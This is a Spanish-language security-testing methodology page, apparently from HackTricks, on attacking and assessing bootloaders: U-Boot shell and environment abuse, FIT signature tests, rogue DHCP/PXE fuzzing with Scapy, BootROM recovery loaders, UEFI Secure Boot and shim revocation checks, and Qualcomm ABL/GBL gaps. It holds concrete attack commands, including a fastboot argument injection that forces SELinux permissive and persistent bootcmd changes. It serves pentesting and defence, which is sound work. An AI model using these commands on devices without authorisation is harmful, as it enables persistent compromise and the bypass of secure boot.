# Pruebas de Bootloader

{{#include ../../banners/hacktricks-training.md}}

Se recomiendan los siguientes pasos para modificar las configuraciones de inicio del dispositivo y probar bootloaders como U-Boot y los loaders de clase UEFI. Céntrate en obtener ejecución de código temprana, evaluar las protecciones de firma/rollback y abusar de las rutas de recovery o network-boot.

Relacionado: bypass de secure-boot de MediaTek mediante patching de bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## quick wins y abuso del entorno de U-Boot

1. Acceder al shell del intérprete
- Durante el arranque, pulsa una tecla de interrupción conocida (normalmente cualquier tecla, 0, espacio o una secuencia "mágica" específica de la placa) antes de que se ejecute `bootcmd` para acceder al prompt de U-Boot.

2. Inspeccionar el estado y las variables de arranque
- Comandos útiles:
- `printenv` (volcar el entorno)
- `bdinfo` (información de la placa y direcciones de memoria)
- `help bootm; help booti; help bootz` (métodos de arranque del kernel compatibles)
- `help ext4load; help fatload; help tftpboot` (loaders disponibles)

3. Modificar los argumentos de arranque para obtener un root shell
- Añade `init=/bin/sh` para que el kernel acceda a un shell en lugar de ejecutar el init normal:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Hacer netboot desde tu servidor TFTP
- Configura la red y obtiene una imagen de kernel/FIT desde la LAN:
```
# setenv ipaddr 192.168.2.2      # IP del dispositivo
# setenv serverip 192.168.2.1    # IP del servidor TFTP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persistir cambios mediante el entorno
- Si el almacenamiento del entorno no está protegido contra escritura, puedes persistir el control:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Comprueba si existen variables como `bootcount`, `bootlimit`, `altbootcmd` y `boot_targets`, que influyen en las rutas de fallback. Los valores mal configurados pueden permitir interrupciones repetidas hasta el shell.

6. Comprobar funciones de debug/inseguras
- Busca: `bootdelay` > 0, `autoboot` deshabilitado, `usb start; fatload usb 0:1 ...` sin restricciones, capacidad de usar `loady`/`loads` mediante serial, `env import` desde medios no confiables y kernels/ramdisks cargados sin comprobaciones de firma.

7. Pruebas de imágenes/verificación de U-Boot
- Si la plataforma afirma utilizar secure/verified boot con imágenes FIT, prueba imágenes sin firma y manipuladas:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # debería FALLAR si la firma FIT es obligatoria
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # debería FALLAR
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # solo debería arrancar si la clave es trusted
```
- La ausencia de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` o el comportamiento heredado `verify=n` suele permitir arrancar payloads arbitrarios.
- No te limites a un resultado simple de allow/deny: investigaciones recientes sobre FIT demostraron que la propia ruta de verificación puede ser una superficie de ataque pre-auth. Realiza pruebas negativas con datos FIT almacenados externamente (`data-offset`, `data-position`, `data-size`), selección de configuraciones firmadas, `loadables` y el manejo de overlays / `extra-conf`.
- Si tienes un source tree coincidente, `test/vboot/vboot_test.sh` es una forma rápida de reproducir el comportamiento de verificación FIT en el sandbox de U-Boot antes de tocar hardware real.

8. Standard Boot (`bootstd`), `extlinux` y bootflows mediante scripts
- En builds modernos de U-Boot, `bootcmd` suele ser simplemente un wrapper alrededor de Standard Boot. Esto significa que los medios con escritura, PXE o la memoria flash SPI pueden convertirse en la verdadera trust boundary aunque el entorno visible parezca inofensivo.
- El `bootmeth` de `extlinux` busca `extlinux/extlinux.conf` en `/` y `/boot`; el `bootmeth` de script busca primero `boot.scr.uimg` y después `boot.scr`. En network boot, el nombre del script puede proceder de `boot_script_dhcp`.
- Comandos útiles para el triage:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Casos de abuso que deben probarse: medios USB/SD controlados por un atacante situados antes en `boot_targets`, un `/boot/extlinux/extlinux.conf` modificable, un TFTP rogue que proporcione `boot.scr` o la ejecución de scripts respaldados por SPI mediante `script_offset_f`.
- Si la plataforma depende de la verificación FIT, asegúrate de que las configuraciones estén firmadas a nivel de configuración y no solo por imagen; `required-mode=all` es más robusto que aceptar cualquier clave individual requerida.

## Superficie de network-boot (DHCP/PXE) y servidores rogue

9. Fuzzing de parámetros PXE/DHCP
- El manejo heredado de BOOTP/DHCP de U-Boot ha tenido problemas de memory-safety. Por ejemplo, CVE‑2024‑42040 describe una divulgación de memoria mediante respuestas DHCP manipuladas que pueden filtrar bytes de la memoria de U-Boot de vuelta a través de la red. Ejercita las rutas de código DHCP/PXE con valores excesivamente largos o de tipo edge-case (option 67 bootfile-name, opciones del proveedor y campos file/servername) y observa si se producen hangs/leaks.
- Snippet mínimo de Scapy para estresar los parámetros de arranque durante el netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Valida también si los campos de nombre de archivo PXE se pasan a la lógica del shell/loader sin sanitización cuando se encadenan con scripts de provisioning del sistema operativo.

10. Pruebas de command injection mediante un servidor DHCP rogue
- Configura un servicio DHCP/PXE rogue e intenta inyectar caracteres en los campos de nombre de archivo u opciones para alcanzar intérpretes de comandos en fases posteriores de la cadena de arranque. El auxiliary de DHCP de Metasploit, `dnsmasq` o scripts personalizados de Scapy funcionan bien. Asegúrate primero de aislar la red del laboratorio.

## Modos de recovery de la ROM del SoC que anulan el arranque normal

Muchos SoC exponen un modo "loader" de BootROM que acepta código mediante USB/UART incluso cuando las imágenes flash no son válidas. Si los fusibles de secure-boot no están quemados, esto puede proporcionar ejecución de código arbitraria en una fase muy temprana de la cadena.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) o `imx-usb-loader`.
- Ejemplo: `imx-usb-loader u-boot.imx` para enviar y ejecutar un U-Boot personalizado desde la RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Ejemplo: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` o `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Ejemplo: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` para preparar un loader y subir un U-Boot personalizado.

Evalúa si el dispositivo tiene eFuses/OTP de secure-boot quemados. Si no los tiene, los modos de descarga de BootROM suelen saltarse cualquier verificación de nivel superior (U-Boot, kernel, rootfs) ejecutando tu payload de primera fase directamente desde SRAM/DRAM.

## Bootloaders de clase UEFI/PC: comprobaciones rápidas

11. Pruebas de tampering de la ESP, rollback y enrollment de claves
- Monta la EFI System Partition (ESP) y busca componentes del loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` y rutas de logos del proveedor.
- Vuelca el estado de Secure Boot y las bases de datos de claves desde el sistema operativo cuando sea posible:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Si la plataforma está en Setup Mode, acepta el enrollment de claves no autenticado o incluye una Platform Key (PK) de prueba/por defecto (clase PKfail), un administrador local o un atacante con acceso físico puede registrar su propia KEK/db y mantener Secure Boot aparentemente "habilitado" mientras arranca binarios EFI arbitrarios.
- Intenta arrancar con componentes de boot firmados degradados o conocidos como vulnerables si las revocaciones de Secure Boot (`dbx`) no están actualizadas. Si la plataforma aún confía en shims/bootmanagers antiguos, a menudo puedes cargar tu propio kernel o `grub.cfg` desde la ESP para obtener persistence.

12. Pruebas de revocación de shim obsoleto / SBAT / dbx
- Los shims antiguos firmados por Microsoft y los forks de proveedores todavía pueden actuar como una ruta de bootkit al estilo BYOVD si las revocaciones están obsoletas. En un laboratorio aislado, coloca un shim históricamente vulnerable en la ESP e intenta hacer chainload de tu propio `grubx64.efi` o kernel.
- Triage rápido:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Si el shim sigue ejecutándose pese a estar en la lista de revocación, el firmware/el sistema operativo tiene actualizaciones `dbx` obsoletas o confía en un loader forked que nunca heredó las protecciones SBAT upstream.

13. Bugs de parsing de logos de arranque (clase LogoFAIL)
- Varios firmwares OEM/IBV eran vulnerables a fallos de parsing de imágenes en DXE que procesaban logos de arranque. Si un atacante puede colocar una imagen manipulada en la ESP bajo una ruta específica del proveedor (por ejemplo, `\EFI\<vendor>\logo\*.bmp`) y reiniciar, puede ser posible obtener ejecución de código durante el arranque temprano incluso con Secure Boot habilitado. Comprueba si la plataforma acepta logos proporcionados por el usuario y si esas rutas se pueden modificar desde el sistema operativo.


## Gaps de trust de Android/Qualcomm ABL + GBL (Android 16)

En dispositivos Android 16 que utilizan ABL de Qualcomm para cargar la **Generic Bootloader Library (GBL)**, valida si ABL **autentica** la app UEFI que carga desde la partición `efisp`. Si ABL solo comprueba la **presencia** de una app UEFI y no verifica las firmas, una primitive de escritura en `efisp` se convierte en **ejecución de código unsigned pre-OS** durante el arranque.

Comprobaciones prácticas y rutas de abuso:

- **primitive de escritura en efisp**: necesitas una forma de escribir una app UEFI personalizada en `efisp` (root/servicio privileged, bug en una app OEM o una ruta de recovery/fastboot). Sin esto, el gap de carga de GBL no es directamente alcanzable.
- **inyección de argumentos OEM de fastboot** (bug de ABL): algunos builds aceptan tokens adicionales en `fastboot oem set-gpu-preemption` y los añaden a la línea de comandos del kernel. Esto puede utilizarse para forzar SELinux permissive y permitir escrituras en particiones protegidas:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Si el dispositivo está parcheado, el comando debería rechazar los argumentos adicionales.
- **Desbloqueo del bootloader mediante flags persistentes**: un payload de la fase de arranque puede cambiar flags persistentes (por ejemplo, `is_unlocked=1`, `is_unlocked_critical=1`) para emular `fastboot oem unlock` sin los gates de servidor/aprobación del OEM. Esto produce un cambio de postura duradero después del siguiente reinicio.

Notas defensivas/de triage:

- Confirma si ABL realiza la verificación de firma sobre el payload GBL/UEFI procedente de `efisp`. Si no lo hace, trata `efisp` como una superficie de persistence de alto riesgo.
- Comprueba si los handlers OEM de fastboot de ABL están parcheados para **validar el número de argumentos** y rechazar tokens adicionales.

## Precaución con el hardware

Ten cuidado al interactuar con memorias flash SPI/NAND durante el arranque temprano (por ejemplo, conectando pines a tierra para saltarse lecturas) y consulta siempre el datasheet de la memoria flash. Los cortocircuitos realizados en el momento incorrecto pueden corromper el dispositivo o el programmer.

## Notas y consejos adicionales

- Prueba `env export -t ${loadaddr}` y `env import -t ${loadaddr}` para mover blobs del entorno entre la RAM y el almacenamiento; algunas plataformas permiten importar el entorno desde medios extraíbles sin autenticación.
- Para obtener persistence en sistemas basados en Linux que arrancan mediante `extlinux.conf`, modificar la línea `APPEND` (para inyectar `init=/bin/sh` o `rd.break`) en la partición de arranque suele ser suficiente cuando no se aplican comprobaciones de firma.
- Si el objetivo utiliza actualizaciones dual-slot / A/B, revisa las técnicas de anti-rollback y slot-desync en el [firmware analysis overview](README.md) para no pasar por alto gaps de trust exclusivos del updater fuera del propio bootloader.
- Si el userland proporciona `fw_printenv/fw_setenv`, valida que `/etc/fw_env.config` coincida con el almacenamiento real del entorno. Los offsets mal configurados permiten leer/escribir la región MTD equivocada.

## Referencias

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
